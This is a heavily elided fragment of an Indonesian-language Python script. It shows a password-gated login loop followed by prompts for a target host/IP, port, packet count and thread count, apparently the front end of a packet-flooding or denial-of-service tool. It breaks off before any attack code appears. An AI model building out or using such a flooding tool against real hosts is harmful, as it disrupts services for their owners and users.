...
for x in range(100):
    ...
    if(pwd==password):
        ...
        continue
time.sleep(5)
print("\033[92mLOGIN BERHASIL MWNGGUNAKAN PASSWORD \u001b[31m{}".format(pwd))
time.sleep(5)
os.system("clear")
...
░
""")
ip = str(input("\033[95mHOST/IP: \033[91m"))
port = int(input("\033[95mPORT: \033[91m"))
choice = str(input("\033[95mGAS?(y/n): \033[91m"))
times = int(input("\033[95mPAKET: \033[91m"))
threads = int(input("\033[95mTHREAD: \033[91m"))
os.system("clear")
def run():
